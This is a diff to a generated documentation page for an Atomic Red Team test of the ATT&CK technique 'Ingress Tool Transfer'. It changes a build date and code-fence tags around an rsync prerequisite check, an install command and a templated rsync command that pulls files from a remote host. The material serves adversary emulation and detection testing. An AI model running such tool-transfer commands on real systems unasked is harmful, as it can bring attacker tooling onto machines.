@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "3180f7d5-52c0-4493-9ea0-e3431a84773f"
@@ -70,13 +70,13 @@ rsync must be installed on the machine
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1; fi
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 (pkg install -y rsync)||(sudo apt-get -y install rsync)
 ```
 
@@ -86,7 +86,7 @@ if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1; fi
 
 ### Command
 
-```sh
+```bash
 rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 ```
 
